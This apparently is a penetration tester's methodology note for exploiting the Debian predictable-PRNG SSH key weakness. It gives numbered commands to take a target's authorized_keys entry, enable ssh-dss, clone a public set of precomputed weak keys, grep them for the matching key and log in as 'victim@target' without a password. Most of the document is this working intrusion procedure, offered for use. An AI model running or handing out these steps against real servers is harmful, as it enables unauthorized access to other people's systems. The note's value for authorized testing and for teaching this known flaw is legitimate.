# SSH Key Predictable PRNG (Authorized_Keys) Process
This module describes how to attempt to use an obtained authorized_keys file on a host system.

## Requirements for Exploit
* authorized_keys file from the target server
* SSH-DSS String from authorized_keys file
## Steps to Exploit Weakness
1. Get the authorized_keys file. An example of this file would look like so:
```
ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
```
2. Since this is an ssh-dss key, we need to add that to our local copy of `/etc/ssh/ssh_config`:
```
PubkeyAcceptedKeyTypes +ssh-dss
```
3. Get [g0tmi1k's debian-ssh repository](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:
```
git clone https://github.com/g0tmi1k/debian-ssh
tar vjxf debian-ssh/common_keys/debian_ssh_dsa_1024_x86.tar.bz2
```
4. Grab the first 20 or 30 bytes from the key file shown above starting with the `"AAAA..."` portion and grep the unpacked keys with it as:
```
grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
```
Note, if there are plus symbols stop at the them as we don't want `grep` to attempt to interpret them as quantifiers (regexp).
5. IF SUCCESSFUL, this will return a file (84739yufh987fg38fg39847fg38fg3f34f.pub) public file. To use the private key file to connect, drop the '.pb' extension and do:
```
ssh -vvv victim@target -i 84739yufh987fg38fg39847fg38fg3f34f
```
And you should connect without requiring a password. If stuck, the `-vvv` verbosity should provide enough details as to why.
